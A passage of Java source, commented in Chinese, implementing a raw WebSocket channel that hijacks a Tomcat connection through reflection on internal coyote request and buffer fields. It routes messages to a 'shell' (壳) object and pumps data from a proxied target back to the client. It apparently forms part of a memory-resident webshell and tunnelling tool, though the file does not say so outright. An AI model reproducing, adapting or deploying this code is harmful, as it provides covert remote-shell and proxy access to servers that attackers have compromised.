                    closeWith(1009, "message too big");
                    return;
                }
                if (!masked) {
                    closeWith(1002, "client frame must be masked");
                    return;
                }
                if (opcode >= 0x8 && (!fin || length > 125)) {
                    closeWith(1002, "invalid control frame");
                    return;
                }

                byte[] mask = new byte[4];
                readFully(mask, 0, mask.length);
                byte[] message = readMaskedPayload(length, mask);

                if (opcode == OP_CLOSE) {
                    // RFC 6455 §5.5：Close 负载长度只能是 0 或 >=2
                    if (message.length == 1) {
                        closeWith(1002, "invalid close payload");
                        return;
                    }
                    sendFrame(OP_CLOSE, message);
                    closeConnection();
                    return;
                }
                if (opcode == OP_PING) {
                    sendFrame(OP_PONG, message);
                    continue;
                }
                if (opcode == OP_PONG) {
                    continue;
                }
                if (opcode == OP_CONT) {
                    if (fragments == null) {
                        closeWith(1002, "unexpected continuation");
                        return;
                    }
                    fragments.write(message);
                    if (fragments.size() > MAX_MESSAGE_SIZE) {
                        closeWith(1009, "message too big");
                        return;
                    }
                    if (fin) {
                        dispatch(fragmentOpcode, fragments.toByteArray());
                        fragments = null;
                        fragmentOpcode = -1;
                    }
                    continue;
                }
                if (opcode == OP_TEXT || opcode == OP_BINARY) {
                    if (fragments != null) {
                        closeWith(1002, "expected continuation");
                        return;
                    }
                    if (fin) {
                        dispatch(opcode, message);
                    } else {
                        fragmentOpcode = opcode;
                        fragments = new ByteArrayOutputStream();
                        fragments.write(message);
                    }
                    continue;
                }
                closeWith(1002, "unknown opcode");
                return;
            }
        } catch (Throwable ignored) {
        }
    }

    /**
     * 不能按帧头声明长度立即分配整块数组（恶意帧头声明 50MB 但不发数据即可耗尽堆），
     * 分块读入随数据增长；掩码按全局偏移应用。
     */
    private byte[] readMaskedPayload(long length, byte[] mask) throws IOException {
        int total = (int) length;
        int chunkSize = Math.min(total, IO_BUFFER_SIZE);
        ByteArrayOutputStream out = new ByteArrayOutputStream(chunkSize);
        byte[] chunk = new byte[chunkSize];
        int received = 0;
        while (received < total) {
            int n = Math.min(chunkSize, total - received);
            readFully(chunk, 0, n);
            for (int i = 0; i < n; i++) {
                chunk[i] = (byte) (chunk[i] ^ mask[(received + i) % 4]);
            }
            out.write(chunk, 0, n);
            received += n;
        }
        return out.toByteArray();
    }

    private void dispatch(int opcode, byte[] message) {
        if (opcode == OP_TEXT) {
            invokeQuietly(onReadText, shell, new Object[]{this, new String(message, UTF8)});
        } else {
            invokeQuietly(onReadBinary, shell, new Object[]{this, message});
        }
    }

    public void sendText(String text) {
        sendFrame(OP_TEXT, text.getBytes(UTF8));
    }

    public void sendBinary(byte[] data) {
        sendFrame(OP_BINARY, data);
    }

    /**
     * 供壳主动结束会话（如代理建连失败）：发送 Close 帧并释放底层连接。
     */
    public void close() {
        closeWith(1000, null);
    }

    private void sendFrame(int opcode, byte[] data) {
        synchronized (writeLock) {
            if (closed) {
                return;
            }
            try {
                int length = data.length;
                byte[] header;
                if (length <= 125) {
                    header = new byte[]{0, (byte) length};
                } else if (length <= 0xFFFF) {
                    header = new byte[]{0, 126, (byte) ((length >>> 8) & 0xFF), (byte) (length & 0xFF)};
                } else {
                    header = new byte[10];
                    header[1] = 127;
                    for (int i = 0; i < 8; i++) {
                        header[9 - i] = (byte) (((long) length >>> (8 * i)) & 0xFF);
                    }
                }
                header[0] = (byte) (0x80 | opcode);
                writeWire(header, 0, header.length);
                writeWire(data, 0, data.length);
                flushWire();
            } catch (Throwable t) {
                closeConnection();
            }
        }
    }

    private void closeWith(int code, String reason) {
        byte[] reasonBytes = reason == null ? new byte[0] : reason.getBytes(UTF8);
        byte[] data = new byte[2 + reasonBytes.length];
        data[0] = (byte) ((code >>> 8) & 0xFF);
        data[1] = (byte) (code & 0xFF);
        System.arraycopy(reasonBytes, 0, data, 2, reasonBytes.length);
        sendFrame(OP_CLOSE, data);
        closeConnection();
    }

    public Object getAttribute(String name) {
        Map map = attributes;
        return map == null ? null : map.get(name);
    }

    public void setAttribute(String name, Object value) {
        if (attributes == null) {
            attributes = new HashMap();
        }
        if (value == null) {
            attributes.remove(name);
        } else {
            attributes.put(name, value);
        }
    }

    /**
     * 为 Proxy 壳提供目标端到客户端的异步泵送。
     */
    public void startPump(InputStream targetInput) {
        if (targetInput == null) {
            return;
        }
        this.pumpInput = targetInput;
        Thread thread = new Thread(this, "rawws-pump");
        thread.setDaemon(true);
        thread.setContextClassLoader(getClass().getClassLoader());
        thread.start();
    }

    @Override
    public void run() {
        InputStream targetInput = pumpInput;
        if (targetInput == null) {
            return;
        }
        byte[] buffer = new byte[8192];
        try {
            while (!closed) {
                int count = targetInput.read(buffer);
                if (count == -1) {
                    break;
                }
                if (count > 0) {
                    byte[] data = new byte[count];
                    System.arraycopy(buffer, 0, data, 0, count);
                    sendBinary(data);
                }
            }
        } catch (Throwable ignored) {
        }
        closeWith(1000, null);
    }

    // ---------------------------------------------------------------- 反射工具

    private static Object getRequestCoyote(Object request) {
        Object coyote = getFieldChain(request, new String[]{"request", "coyoteRequest"});
        if (coyote == null) {
            coyote = getField(request, "coyoteRequest");
        }
        return coyote;
    }

    private static Object getResponseCoyote(Object response) {
        Object coyote = getFieldChain(response, new String[]{"response", "coyoteResponse"});
        if (coyote == null) {
            coyote = getField(response, "coyoteResponse");
        }
        return coyote;
    }

    /**
     * 头部解析后容器缓冲区里可能还有客户端紧随其后的帧数据；容器在 BIO/APR/NIO
     * 下用不同字段保存，能拿到多少先拿多少。
     */
    private static byte[] extractLeftover(Object inputBuffer) {
        Object byteBuffer = getField(inputBuffer, "byteBuffer");
        if (byteBuffer instanceof ByteBuffer) {
            ByteBuffer view = ((ByteBuffer) byteBuffer).duplicate();
            if (view.hasRemaining()) {
                byte[] data = new byte[view.remaining()];
                view.get(data);
                return data;
            }
            return null;
        }
        Object buf = getField(inputBuffer, "buf");
        Object pos = getField(inputBuffer, "pos");
        Object lastValid = getField(inputBuffer, "lastValid");
        if (buf instanceof byte[] && pos instanceof Integer && lastValid instanceof Integer) {
            int start = ((Integer) pos).intValue();
            int end = ((Integer) lastValid).intValue();
            byte[] bytes = (byte[]) buf;
            if (start >= 0 && end > start && end <= bytes.length) {
                byte[] data = new byte[end - start];
                System.arraycopy(bytes, start, data, 0, data.length);
                return data;
            }
        }
        return null;
    }

    private static Object getFieldChain(Object target, String[] names) {
        Object current = target;
        for (String name : names) {
            current = getField(current, name);
            if (current == null) {
                return null;
            }
        }
        return current;
    }

    private static Object getField(Object target, String name) {
        if (target == null) {
            return null;
        }
        Class<?> clazz = target.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(target);
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            } catch (Throwable ignored) {
                return null;
            }
        }
        return null;
    }

    private static void setField(Object target, String name, Object value) {
        if (target == null) {
            return;
        }
        Class<?> clazz = target.getClass();
        while (clazz != null && clazz != Object.class) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                field.set(target, value);
                return;
            } catch (NoSuchFieldException ignored) {
                clazz = clazz.getSuperclass();
            } catch (Throwable ignored) {
                return;
            }
        }
    }

    private static Object invoke(Object target, String name, Class[] parameterTypes, Object[] args) {
        try {
            Method method = target.getClass().getMethod(name, parameterTypes);
            return method.invoke(target, args);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static Method findMethod(Object target, String name, Class[] parameterTypes) {
        try {
            return target.getClass().getMethod(name, parameterTypes);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void invokeQuietly(Method method, Object target, Object[] args) {
        if (method == null) {
            return;
        }
        try {
            method.invoke(target, args);
        } catch (Throwable ignored) {
        }
    }

    private static String acceptKey(String key) {
        try {
            MessageDigest sha1 = MessageDigest.getInstance("SHA-1");
            return base64Encode(sha1.digest((key + GUID).getBytes(UTF8)));
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String base64Encode(byte[] data) {
        try {
            Class<?> base64Class = Class.forName("java.util.Base64");
            Object encoder = base64Class.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class)
                    .invoke(encoder, new Object[]{data});
        } catch (Throwable ignored) {
        }
        try {
            Class<?> encoderClass = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = encoderClass.newInstance();
            String value = (String) encoderClass.getMethod("encode", byte[].class)
                    .invoke(encoder, new Object[]{data});
            return value.replace("\n", "").replace("\r", "");
        } catch (Throwable ignored) {
            return null;
        }
    }
}
